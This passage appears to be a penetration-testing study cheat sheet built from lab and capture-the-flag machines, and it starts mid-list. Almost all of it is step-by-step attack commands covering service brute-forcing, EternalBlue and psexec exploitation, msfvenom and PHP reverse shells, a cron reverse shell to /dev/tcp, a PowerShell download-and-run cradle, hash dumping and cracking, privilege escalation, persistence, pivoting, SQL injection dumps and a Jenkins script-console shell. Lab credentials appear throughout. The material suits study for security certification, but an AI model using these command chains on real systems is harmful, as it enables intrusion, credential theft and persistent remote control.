                    
                    `set AUTH_URI /secure`
                    
                    `unset USERPASS_FILE`
                    
                    `set USER_FILE /usr/share/metasploit-framework/data/wordlists/namelist.txt`
                    
                    `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
                    
                    `set VERBOSE false`
                    
                    `run`
                    
            - MySQL
                
                MySQL - 3306
                
                1. `service postgresql start && msfconsole`
                    
                2. `workspace -a SQL_ENUM`
                    
                3. `setg RHOSTS 10.10.10.10`
                    
                4. `use auxiliary/scanner/mysql/mysql_version`
                    
                5. `use auxiliary/scanner/mysql/mysql_login`
                    
                    `set USERNAME root`
                    
                    `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
                    
                    `set VERBOSE false`
                    
                    `run root:twinkle`
                    
                6. `use auxiliary/admin/mysql/mysql_enum`
                    
                    `set USERNAME root`
                    
                    `set PASSWORD twinkle`
                    
                    `run`
                    
                7. `use auxiliary/admin/mysl/mysql_mysql`
                    
                    `set USERNAME root`
                    
                    `set PASSWORD twinkle`
                    
                    `set SQL show databases;`
                    
                    `run`
                    
                8. `use auxiliary/scanner/mysql/mysql_schema`
                    
                    `set username and password`
                    
                9. `mysql -h 10.10.10.10 -u root -p twinkle`
                    
            - SSH
                
                Secure Shell - 22
                
                1. `service postgresql start && msfconsole`
                    
                2. `workspace -a ssh_enum`
                    
                3. `setg rhosts 10.10.10.10`
                    
                4. `use auxiliary/scanner/ssh/ssh_version`
                    
                5. `use auxiliary/scanner/ssh/ssh_login`
                    
                    `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`
                    
                    `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt`
                    
                    `run sysadmin:hailey`
                    
                6. `use auxiliary/scanner/ssh/ssh_enumusers`
                    
                    `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`
                    
            - SMTP
                
                Simple Mail Transfer Protocol - 25,465, 587
                
                1. `service postgresql start && msfconsole`
                2. `workspace -a smtp_enum`
                3. `setg rhosts 10.10.10.10`
                4. `use auxiliary/scanner/smtp/smtp_version`
                5. `use auxiliary/scanner/smtp/smtp_enum`
        
    - Exploitation
        
        **Banner Grabbing**
        
        - `nmap -sV --script=banner 192.167.72.3`
        - `nc 192.167.72.3 22`
        
        **Searching for exploits**
        
        - Exploitdb
            
        - searchsploit
            
        - google hacking database
            
        - CVE
            
        - Windows Exploitation
            
            - `nmap -sV 10.2.29.246`
            - `nmap -T4 -PA -sC -sV -p 1-10000 10.2.29.246 -oX nmap_10k`
            - `service postgresql start && msfconsole`
            - `db_status workspace -a Win2k8 setg RHOST 10.2.29.246 setg RHOSTS 10.2.29.246 db_import nmap_10k`
            - `hosts services use auxiliary/scanner/smb/smb_version run hosts`
            
            1. **IIS/FTP**
            
            - `nmap -sV -sC -p21,80 10.2.29.246`
            - `ftp 10.2.29.246` - anonymous login failed
            - `hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.2.29.246 ftp`
            - `hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_users.txt 10.2.29.246 ftp -I`
            - Now login using valid user cred
            - `ftp 10.2.29.246` Use administartor:vagrant
            - Create one .asp and upload to ftp
            - `msfvenom -p windows/shell/reverse_tcp LHOST=10.10.24.4 LPORT=1234 -f asp > shell.aspx`
            - `ftp 10.2.29.246` Use vagrant:vagrant
            - `put shell.aspx`
            - Go to msfconsole session
            - `use multi/handler set payload windows/shell/reverse_tcp set LHOST 10.10.24.4 set LPORT 1234`
            - Open the browser and navigate to 10.2.29.246/shell.aspx
            - got reverse shell
            
            1. **OpenSSH**
            
            - `nmap -sV -sC -p 22 10.2.16.83`
            - `hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_users.txt 10.2.16.83 ssh`
            - `hydra -l administrator /usr/share/wordlists/metasploit/unix_users.txt 10.2.16.83 ssh`
            - `ssh [vagrant@10.2.16.83](<mailto:vagrant@10.2.16.83>)` use vagrant:vagrant
            - `net localgroup administrators`
            - `msfconsole`
            - `use auxiliary/scanner/ssh/ssh_login setg RHOST 10.2.16.83 setg RHOSTS 10.2.16.83 set USERNAME vagrant set PASSWORD vagrant run session -u 1`
            - Got meterpreter sessions
            
            1. **SMB**
            
            - `nmap -sV -sC -p 445 10.2.26.45`
            - `hydra -l administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.2.26.45 smb`
            - `hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.2.26.45 smb`
            - `smbclient -L 10.2.26.45 -U vagrant`
            - `smbmap -u vagrant -p vagrant -H 10.2.26.45`
            - `enum4linux -u vagrant -p vagrant -U 10.2.26.45`
            - `locate [psexec.py](<http://psexec.py/>) cp /usr/share/doc/python3-impacket/examples/psexec.py . chmod +x [psexec.py](<http://psexec.py/>)`
            - `python3 [psexec.py](<http://psexec.py/>) [Administrator@10.2.26.45](<mailto:Administrator@10.2.26.45>)`
            - `msfconsole -q use exploit/windows/smb/psexec set RHOSTS 10.2.26.45 set SMBUser Administrator set SMBPass vagrant set payload windows/x64/meterpreter/reverse_tcp run`
            - `use exploit/windows/smb/ms17_010_eternalblue options set RHOSTS 10.2.26.45 run`
            
            1. **MYSQL**
            
            - `nmap -sV -sC -p 3306,8585 10.2.26.45`
            - `use auxiliary/scanner/mysql/mysql_login set RHOSTS 10.2.26.45 set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt run`
            - `mysql -u root -p -h 10.2.26.45 - root password is empty`
            - `show databases; use wordpress; show tables; select * from wp_users;`
            - `UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin'; - change password`
            - `exploit eternalblue`
            - `use exploit/windows/smb/ms17_010_eternalblue set RHOSTS 10.2.26.45 run`
            - `sysinfo`
            - `cd / cd wamp dir cd www\\\\wordpress cat wp-config.php`
            - see mysql cred in this file
        - Linux Exploitation
            
            - cat /etc/hosts
            - nmap -sV -p 1-10000 10.2.20.205 -oX nmap_10k
            - nc -nv 10.2.20.205 1524 - provides a direct shell
            - cat /etc/*release
            - Access the web server [](http://10.2.20.205/)[http://10.2.20.205](http://10.2.20.205)
            
            **vsFTPd**
            
            - `nmap -sV -sC -p 21 10.2.20.205`
            - `ftp 10.2.20.205` - anonymous login
            - `use auxiliary/scanner/smtp/smtp_enum setg RHOSTS 10.2.20.205 set UNIXONLY true run`
            - `hydra -l service -P /usr/share/metasploit-framework/data/wordlists/unix_users.txt 10.2.20.205 ftp` got cred service: service
            - `ftp 10.2.20.205` use service: service
            - Upload a **`PHP`** reverse shell via FTP to the `/dav` directory and launch it with the browser
            - `ls -al /usr/share/webshells/php/ cp /usr/share/webshells/php/php-reverse-shell.php . mv php-reverse-shell.php shell.php vim shell.php`
            - `nc -nvlp 1234`
            - Login with FTP again and upload the shell.php
            - `cd / cd /var/www/ put shell.php`
            - Open the browser [http://10.2.20.205/dav/](http://10.2.20.205/dav/)
            - run shell.php
            - Got reverse shell in netcat listener
            
            **PHP**
            
            - [http://10.2.20.205/phpinfo.php](http://10.2.20.205/phpinfo.php)
            - Exploit using this `exploit/multi/http/php_cgi_arg_injection`
            
            **SAMBA**
            
            - `nmap -sV -p 445 10.2.20.205`
            - `nc -nv 10.2.20.205 445`
            - `search smb_version use auxiliary/scanner/smb/smb_version setg RHOSTS 10.2.20.205 run`
            - `use exploit/multi/samba/usermap_script`
            - `run`
            - update to meterpreter
            - `cat /etc/shadow`
    - Post Exploitation
        
        - Local Enumeration
            
            - Windows
                
                - `nmap -sV 10.2.16.155`
                - `service postgresql start && msfconsole -q`
                - Exploit rejetto
                - Got meterpreter session
                - `getuid`
                - `sysinfo`
                - `show_mount`
                - `cat C:\\\\Windows\\\\System32\\\\eula.txt`
                - `shell`
                - `hostname`
                - `systeminfo`
                - `wmic qfe get Caption,Description,HotFixID,InstalledOn`
                - `getuid - Admin already`
                - `getprivs`
                - current logged-on users `query user`
                - Display all accounts - `net users`
                - `net user Administrator`
                - Enumerate groups `net localgroup`
                - `net localgroup Administrators`
                - `net localgroup "Remote Desktop Users”`
                - `ipconfig ipconfig /all`
                - `route print` - display routing table
                - arp table - `arp -a`
                - Listening connections/ ports - `netstat -ano`
                - Firewall state - `netsh firewall show state`
                - running procesess - `ps`
                - `pgrep explorer.exe`
                - `migate 744`
                - `wmic service list brief`
                - running tasks - `tasklist /SVC`
                
                **Automation**
                
                - [https://github.com/411Hall/JAWS](https://github.com/411Hall/JAWS)
                - Run this command in powershell `PS C:\\temp> .\\jaws-enum.ps1 -OutputFileName Jaws-Enum.txt`
                - Go to msfconsole session back
                - `session 1 cd C:\\\\ mkdir Temp cd Temp upload /root/Desktop/jaws-enum.ps1 shell`
                - `powershell.exe -ExecutionPolicy Bypass -File .\\jaws-enum.ps1 -OutputFilename Jaws-Enum.txt`
                - `download Jaws-Enum.txt`
                
                **Metasploit**
                
                - `use post/windows/gather/win_privs`
                - `use post/windows/gather/enum_logged_on_users`
                - `use post/windows/gather/checkvm`
                - `use post/windows/gather/enum_applications`
                - `use post/windows/gather/enum_computers`
                - `use post/windows/gather/enum_patches`
                - `use post/windows/gather/enum_shares`
            - Linux
                
                - `nmap -sV 192.218.227.3`
                - Exploit vsftpd
                - `use exploit/unix/ftp/vsftpd_234_backdoor`
                - Get shell
                - `/bin/bash -i`
                - Update shell session to meterpreter
                - `sessions -u 1`
                - `sessions 2`
                - `getuid`
                - `sysinfo`
                - `shell /bin/bash -i cd /root`
                - `hostname`
                - `cat /etc/issue`
                - `cat /etc/*release`
                - `uname -a`
                - `env`
                - `lscpu`
                - `free -h`
                - `df -h`
                - `lsblk | grep sd`
                - `whoami`
                - `id`
                - `ls -al /home cat /etc/passwd`
                - `cat /etc/passwd | grep -v /nologin`
                - `groups root`
                - `ifconfig`
                - `netstat`
                - `route`
                - `arp`
                - `shell /bin/bash -i`
                - `cat /etc/networks`
                - `cat /etc/hosts`
                - `cat /etc/resolv.conf`
                - `arp -a`
                - `ps`
                - `ps aux`
                - `cat /etc/cron*`
                - `crontab -l`
                
                **Automation**
                
                - [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
                - `./LinEnum.sh -s -k keyword -r report -e /tmp/ -t`
                - Go back to meterpreter session
                - `session 1 cd /tmp upload /root/Desktop/LinEnum.sh shell /bin/bash -i`
                - `id`
                - `chmod +x [LinEnum.sh](<http://linenum.sh/>) ./LinEnum.sh`
                
                **Metasploit**
                
                - `nmap -sV 192.19.208.3`
                - Exploit shellshock
                - `service postgresql start && msfconsole -q search shellshock use exploit/multi/http/apache_mod_cgi_bash_env_exec setg RHOSTS 192.19.208.3 setg RHOST 192.19.208.3 set TARGETURI /gettime.cgi run`
                - `use post/linux/gather/enum_configs`
                - `use post/linux/gather/enum_network`
                - `use post/linux/gather/enum_system`
                - `use post/linux/gather/checkvm`
        - Privilege Escalation
            
            - Windows
                - `nmap -sV 10.2.29.53`
                - `service postgresql start && msfconsole -q`
                - `setg RHOSTS 10.2.29.53 setg RHOST 10.2.29.53`
                - `search web_delivery use exploit/multi/script/web_delivery`
                - `set target PSH\\ (Binary) set payload windows/shell/reverse_tcp set PSH-EncodedCommand false set LHOST eth1 exploit`
                - `powershell.exe -nop -w hidden -c [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$z="echo ($env:temp+'\\P4MPrq7y.exe')"; (new-object System.Net.WebClient).DownloadFile('<http://10.10.24.2:8080/y3MMtnMlRkQ81pA>', $z); invoke-item $z`
                - `sessions 1`
                - `whoami`
                - `background search shell_to use post/multi/manage/shell_to_meterpreter set LHOST eth1 set SESSION 1 show advanced set WIN_TRANSFER VBS options`
                - `run sessions 2`
                - `ps migrate 5048 get privs`
                - `cd C:\\\\Users\\\\student\\\\Desktop\\\\PrivescCheck shell dir`
                - `powershell -ep bypass -c ". .\\PrivescCheck.ps1; Invoke-PrivescCheck”`
                - `powershell -ep bypass -c ". .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME%”`
                - `exit meterpreter > download PrivescCheck_ATTACKDEFENSE.txt`
                - [`psexec.py](<http://psexec.py/>) [administrator@10.2.29.53](<mailto:administrator@10.2.29.53>) cmd.exe`
                - `cd C:\\Users\\Administrator\\Desktop dir type flag.txt`
            - Linux
                - `whoami`
                - `find / -not -type l -perm -o+w`
                - `s -l /etc/shadow cat /etc/shadow`
                - `openssl passwd -1 -salt abc password123`
                - `vim /etc/shadow`
                - `su`
                - `cd ls cat flag`
                - Misconfigured sudo
                - `find / -user root -perm -4000 -exec ls -ldb {} \\;`
                - `find / -perm -u=s -type f 2>/dev/null`
                - `sudo -l`
                - `sudo man ls`
                - `!/bin/bash`
                - got root
                - get the flag
        - Persistence
            
            **Windows**
            
            - `nmap -sV 10.2.20.244`
            - Exploit rejetto
            - Got meterpreter sessions
            - `sysinfo`
            - `getuid`
            - `background search platform:windows persistence use exploit/windows/local/persistence_service info set payload windows/meterpreter/reverse_tcp set LPORT 4443 sessions set SESSION 3 run`
            - Kill all MSF sessions
            - `sessions -K`
            - `exit`
            - `msfconsole -q use multi/handler options set payload windows/meterpreter/reverse_tcp set LHOST eth1 set LPORT 4444 run`
            - Second approach RDP
            - `service postgresql start && msfconsole -q`
            - `db_status setg RHOSTS 10.2.20.249 setg RHOST 10.2.20.249 workspace -a RDP_persistence db_nmap -sV 10.2.20.249`
            - `use exploit/windows/http/badblue_passthru run`
            - `sysinfo`
            - `getuid`
            - `pgrep explorer migrate 3132`
            - `run getgui -e -u newuser -p attack_1234321`
            - `xfreerdp /u:newuser /p:attack_1234321 /v:10.2.20.249`
            - Meterprer run this command - run `multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__20230429.4245.rc`
            
            **Linux**
            
            - `ssh [student@192.3.140.3](<mailto:student@192.3.140.3>)` use password
            - `ls -al`
            - `cat wait`
            - `cd .ssh ls`
            - `cat id_rsa`
            - `cat authorized_keys`
            - `scp [student@192.3.140.3](<mailto:student@192.3.140.3>):~/.ssh/id_rsa . chmod 400 id_rsa`
            - `ssh [student@192.3.140.3](<mailto:student@192.3.140.3>) rm wait`
            - `ssh -i id_rsa [student@192.3.140.3](<mailto:student@192.3.140.3>)`
            - 2nd cron
            - `cat wait`
            - `cat /etc/cron*`
            - `echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.175.36.2/1234 0>&1'" > cron`
            - `crontab -i cron crontab -l`
            - logback again
            - `ssh [student@192.175.36.3](<mailto:student@192.175.36.3>) rm wait`
            - `nc -nvlp 1234`
        - Dumping & Cracking
            
            **Windows**
            
            - `nmap -sV -p 80 10.2.24.37`
            - `service postgresql start && msfconsole -q`
            - Exploit badblue
            - Got meterpreter session
            - `sysinfo`
            - `getuid`
            - `get privs`
            - `pgrep lsass migrate 688`
            - `hashdump`
            - `john --list=formats | grep NT`
            - `john --format=NT hashes.txt`
            - `john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt`
            - `hashcat -a 3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt`
            - `hashcat -a 3 -m 1000 --show hashes.txt /usr/share/wordlists/rockyou.txt`
            - `xfreerdp /u:Administrator /p:password /v:10.2.24.37`
            
            **Linux**
            
            - `nmap -sV 192.22.107.3`
            - `service postgresql start && msfconsole -q`
            - Exploit proftpd backdoor
            - `/bin/bash -i`
            - `cat /etc/shadow`
            - `use post/linux/gather/hashdump`
            - `john --format=sha512crypt /root/.msf4/loot/20230429153134_default_192.22.107.3_linux.hashes_083080.txt --wordlist=/usr/share/wordlists/rockyou.txt`
            - `hashcat -a 3 -m 1800 /root/.msf4/loot/20230429153134_default_192.22.107.3_linux.hashes_083080.txt /usr/share/wordlists/rockyou.txt`
        - Pivoting
            
            - `service postgresql start && msfconsole`
            - `workspace -a Pivoting`
            - `db_nmap -sV -p- -O <Victim1IP>`
            - `services`
            - `search rejetto`
            - `use exploit/windows/http/rejetto_hfs_exec`
            - `show options`
            - `set rhosts <Victim1IP>`
            - `run`
            - Got Meterpreter session
            - `sysinfo`
            - `getuid`
            - `ipconfig`
            - `run autoroute -s <Victim2IP/24>`
            - run this in background
            - `background`
            - rename the session 1 meterpreter
            - `sessions -n victim1 -i 1`
            - `sessions`
            - Now portscan
            - `search portscan`
            - `use auxiliary/scanner/portscan/tcp`
            - `show options`
            - `set rhosts Victim2iP`
            - `exploit`
            - Port 80 open port found on victim2
            - Now go to session in metereter
            - `sessions 1`
            - `portfwd add -l 1234 -p 80 -r <Victim2IP>`
            - Now again put this session in background
            - `background`
            - `db_nmap -sV -sS -p 1234 localhost`
            - `search badblue`
            - `use exploit/windows/http/badblue_passthru`
            - `show options`
            - `set payload windows/meterpreter/bind_tcp`
            - `set rhosts <Victim2IP>`
            - `set LPORT 4433`
            - `run`
            - got meterpreter session
            - Observe that this is 2016 and old is 2012
            - get flag
- Web Application Penetration Testing
    
    **Web & HTTP Protocols**
    
    1. Request methods
    2. Status codes
    
    **Directory Enumeration - [Go buster & Burp suite]**
    
    1. `sudo apt update && sudo apt install -y gobuster`
        
    2. `gobuster dir -u <http://192.21.23.23> -w /usr/share/wordlists/dirb/common.txt`
        
    3. `gobuster dir -url <http://192.21.23.23> -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r`
        
    4. `gobuster dir -url <http://192.21.23.23/data> -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r`
        
    5. Turn on burp
        
    6. capture the GET / request and send to Intruder
        
    7. User burp custom wordlists, or select for your wish
        
    8. start attack
        
    
    **Scanning web application - [ZAP & Nikto]**
    
    1. Zap manual and automatic scan
    2. Nikto scan- `nikto -h [<http://192.157.60.3>](<http://192.157.60.3/>) -o niktoscan-192.157.60.3.txt`
    3. `nikto -h <http://192.157.60.3/index.php?page=arbitrary-file-inclusion.php> -Tuning 5 -o nikto.html -Format htm`
    4. `firefox nikto.html`
    5. [`http://192.157.60.3/index.php/index.php?page=../../../../../../../../../../etc/passwd`](http://192.157.60.3/index.php/index.php?page=../../../../../../../../../../etc/passwd)
    
    **Passive Crawling with Burp suite**
    
    1. Turn on burp
    2. Check HTTP history and crawl endpoints
    3. Add target and scan it
    
    **SQL Injection- sqlmap**
    
    1. [http://192.42.186.3/sqli_1.php?title=hacking&action=search](http://192.42.186.3/sqli_1.php?title=hacking&action=search)
    2. `sqlmap -u "<http://192.42.186.3/sqli_1.php?title=hacking&action=search>" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title`
    3. hacking' AND (SELECT 1819 FROM(SELECT COUNT(*),CONCAT(0x716a767171,(SELECT (ELT(1819=1819,1))),0x7171707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'bLrY'='bLrY&action=search
    4. `sqlmap -u "<http://192.42.186.3/sqli_1.php?title=hacking&action=search>" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title --dbs`
    5. `sqlmap -u "<http://192.42.186.3/sqli_1.php?title=hacking&action=search>" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title -D bWAPP --tables`
    6. `sqlmap -u "<http://192.42.186.3/sqli_1.php?title=hacking&action=search>" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title -D bWAPP -T users --columns`
    7. `sqlmap -u "<http://192.42.186.3/sqli_1.php?title=hacking&action=search>" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title -D bWAPP -T users -C admin,password,email --dump`
    8. `sqlmap -r request -p title`
    
    **XSS attack with XSSer**
    
    1. `xsser --url '<http://192.131.167.3/index.php?page=dns-lookup.php>' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'`
    2. `xsser --url '<http://192.131.167.3/index.php?page=dns-lookup.php>' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto`
    3. `xsser --url '<http://192.131.167.3/index.php?page=dns-lookup.php>' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script>"`
    
    **Attacking HTTP Login form**
    
    **Hydra**
    
    1. echo -e "admin\nbee\nuser1\nuser2" > users
    2. cat /root/Desktop/wordlists/100-common-passwords.txt > pws
    3. echo "bug" >> pws
    4. `hydra -L users -P pws 192.210.201.3 http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!”`
    
    **ZAProxy**
    
    1. Capture the login post request
    2. fuzz
    3. Addpayloada
    4. Start fuzzer
    
    **Burp suite**
    
    1. capture the req [http://192.190.241.3/basic](http://192.190.241.3/basic)
    2. decode the basic encoded value - base64 decode
    3. Add basic encrypted value
    4. Choose sniper
    5. Load the common.txt payloads
    6. Add payload processing [1. Add prefix admin: 2. encode - base64 encode]
    7. Start attack
    8. Got 301 req, capture the encoded cred
    9. decrypt and get the flag
- Drupal
    
    ref: [https://www.spoofman.co.uk/courses/englishdump](https://www.spoofman.co.uk/courses/englishdump)
    
    [https://walk-throughs.medium.com/exploiting-drupal-via-metasploit-ctf-walkthrough-fcd5f5fa2fa](https://walk-throughs.medium.com/exploiting-drupal-via-metasploit-ctf-walkthrough-fcd5f5fa2fa)
    
    IP = **192.168.100.52**
    
    Web application Machine hosting **Drupal**
    
    Exploitation: RCE
    
    $ `ip a`
    
    $ `sudo netdiscover -r 192.168.100.0/24`
    
    $ `sudo nmap -sSVC -p- —open 192.168.100.4`
    
    $ `sudo msfconsole`
    
    > > `search drupal`
    
    > > `use exploit/unix/webapp/drupal_drupalgeddon2`
    
    > > `show options`
    
    > > `set RHOSTS 192.168.100.4`
    
    > > `set TARGETURI /drupal/`
    
    > > `run`
    
    Got meterpreter shell
    
    Open the new terminal and generate one msfvenom payload
    
    $ `msfvenom —payload linux/x86/shell_reverse_tcp —platform linux LHOST=kali ip LPORT=1234 -f elf -o sh.elf`
    
    $ `nc -lvnp 1234`
    
    Now again go to meterpreter session
    
    meterpreter> `upload sh.elf`
    
    Upload completed
    
    Bow open shell session
    
    meterpretrr> `shell`
    
    `chmod +x sh.elf`
    
    Now execute this
    
    `./sh.elf`
    
    Now we got reverse shell in the netcat that listening
    
    Now terminate the meterpreter session, and go to netcat got reverse shell
    
    `python -c ‘import pty;pty.spawn(”/bin/bash”)’`
    
    got shell
    
    www-data@DC-1:/var/www$ `export TERM=xterm`
    
    now press ctrl Z
    
    now type this command in the same terminal
    
    $ `stty raw echo;fg;reset`
    
    Now enter ctrl C
    
    Now we got full interactive shell
    
    www-data@DC-1:/var/www$
    
    DB Enum
    
    www-data@DC-1:/var/www$ `ls`
    
    www-data@DC-1:/var/www$ `cd sites`
    
    www-data@DC-1:/var/www/sites$ `ls`
    
    www-data@DC-1:/var/www$ `cd default`
    
    www-data@DC-1:/var/www/sites/default$ `ls`
    
    www-data@DC-1:/var/www/sites/default$ `cat settings.php`
    
    We will get the database credentials in the settings.php file
    
    Now login to mysql database using the cred we get in the settings.php file
    
    www-data@DC-1:/var/www$ `mysql -u dbuser -D drupaldb -p`
    
    password: R0ck3t
    
    Login successful
    
    mysql> `show databases;`
    
    mysql> `use drupaldb;` in exam it is syntex
    
    mysql> `show tables;`
    
    mysql> `SELECT * FROM users;`
    
    mysql> `SELECT name,pass,mail FROM users;`
    
    copy all the details and exit it
    
    mysql> `exit`
    
    Login to user Acc
    
    Now login via ssh
    
    $ `ssh auditor@198.168.100.52`
    
    passwrd: qwertyuiop
    
    Login successful to auditor terminal
    
    get flag of user
    
    Another way
    
    www-data@DC-1:/var/www$ `su auditor`
    
    enter password: qwertyuiop
    
    Login successful to auditor terminal
    
    auditor@kalilinux$ get the user flag here
    
    Priv Esc
    
    Now priv escalation to get admin - SUID
    
    www-data@DC-1:/var/www$ `find /etc/passwd -exec ‘/bin/sh’ \\;`
    
    the above command will give root access shell
    
    #`cd /root`
    
    #`ls`
    
    get the root flag here
    
- Word press
    
    Ref: [https://www.youtube.com/watch?v=2TmguIvR3Kw](https://www.youtube.com/watch?v=2TmguIvR3Kw)
    
    $ `nmap -sCSV ip`
    
    $ `[dirsearch.py](<http://dirsearch.py>) -u 10.10.67.11 -E -x 400,500 -r -t 100`
    
    access the site [http://10.10.10.10/blog](http://10.10.10.10/blog)
    
    Modify etc hosts
    
    $ `nano /etc/hosts`
    
    add our ip as internal.thm save that
    
    Now access [http://10.10.10.10/blog](http://10.10.10.10/blog), got actual web page
    
    Now go to login page
    
    internal.thm/blog/wp-login.php
    
    Now run wordpress scan
    
    $ `wpscan —url [<http://10.10.10.10/blog>](<http://internal.thm/blog>) -e vp,u`
    
    Results: No plugins found and one user found: admin
    
    Now brute force password
    
    $ `wpscan —url <http://10.10.10.10/blog> -—usernames admin -—passwords /root/Desktop/passes/rockyou.txt -—max-threads 50`
    
    Got credentials admin: my2boys
    
    Use the credentials and login to the website
    
    After gets login, go through the application
    
    Go to post > private post
    
    Open that private post
    
    Got one user credentials william:arnold147
    
    Now upload malicious php and get reverse shell
    
    In terminal make the netcat listen
    
    $ `nc -lvnp 53`
    
    Now go to the website
    
    Appearance > Theme editor > 404 template
    
    Go to tools in your terminal and copy the php-reverse-shell code
    
    paste the code in 404 template and edit the ip to kali ip and update it
    
    Now go to the 404 template page
    
    [http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php](http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php)
    
    Now in the netcat we get reverse command shell
    
    now type the commands in shell
    
    $ `id`
    
    $ `ls -la`
    
    $ `cd /opt`
    
    $ `ls -la`
    
    $ cat wp-save.txt
    
    We got one more user cred aubreanna:bubb13guM!@123
    
    Now open new terminal and try to login that user vis ssh
    
    $ `ssh aubreanna@10.10.10.10`
    
    password: bubb13guM!@123
    
    Got user terminal
    
    aubreanna@internal$ get the user flag here
    
    aubreanna@internal$ `ls`
    
    aubreanna@internal$ `jenkins.txt`
    
    Internal jenkins is running on 172.17.0.2:8000
    
    aubreanna@internal$ `netstat -ano`
    
    Got to the terminal
    
    $ `ssh -L 8080:172.17.0.2:8080 auberenna@10.10.10.10`
    
    password: bubb13guM!@#123
    
    Now we got login also with docker0 ip
    
    Now go to the website and type 127.0.0.1:8080 is the jenkins login page
    
    Now brute force the password of admin
    
    Go to burp suite
    
    capture the login request
    
    send to intruder
    
    add password
    
    payload use: desktop/customwordlist/kerbrutpass.txt
    
    Got cred admin:spongebob
    
    login to the website using the credentials
    
    Manage jenkins> script console
    
    open netcat listener in aubereana terminal
    
    aubreanna@internal$ `nc -nvlp 8044`
    
    enter the script from [https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
    
    change cmd = “/bin/sh”
    
    put your ip in string host
    
    Now run
    
    Got reverse shell in netcat listerner
    
    id
    
    ls -la
    
    cd /opt
    
    ls -la
    
    cat note.txt
    
    Got root credentials root:tr0ub13guM!@#123
    
    Now open the new terminal and login via ssh
    
    $ `ssh root@10.10.10.10`
    
    password: tr0ub13guM!@#123
    
    Got root user
    
    root@internal$ `la -la`
    
    root@internal$ `cat root.txt`
    
    Got root flag !
    
- Pivoting
    
    - `service postgresql start && msfconsole`
    - `workspace -a Pivoting`
    - `db_nmap -sV -p- -O <Victim1IP>`
    - `services`
    - `search rejetto`
    - `use exploit/windows/http/rejetto_hfs_exec`
    - `show options`
    - `set rhosts <Victim1IP>`
    - `run`
    - Got Meterpreter session
    - `sysinfo`
    - `getuid`
    - `ipconfig`
    - `run autoroute -s <Victim2IP/24>`
    - run this in background
    - `background`
    - rename the session 1 meterpreter
    - `sessions -n victim1 -i 1`
    - `sessions`
    - Now portscan
    - `search portscan`
    - `use auxiliary/scanner/portscan/tcp`
    - `show options`
    - `set rhosts Victim2iP`
    - `exploit`
    - Port 80 open port found on victim2
    - Now go to session in metereter
    - `sessions 1`
    - `portfwd add -l 1234 -p 80 -r <Victim2IP>`
    - Now again put this session in background
    - `background`
    - `db_nmap -sV -sS -p 1234 localhost`
    - `search badblue`
    - `use exploit/windows/http/badblue_passthru`
    - `show options`
    - `set payload windows/meterpreter/bind_tcp`
    - `set rhosts <Victim2IP>`
    - `set LPORT 4433`
    - `run`
    - got meterpreter session
    - Observe that this is 2016 and old is 2012
    - get flag

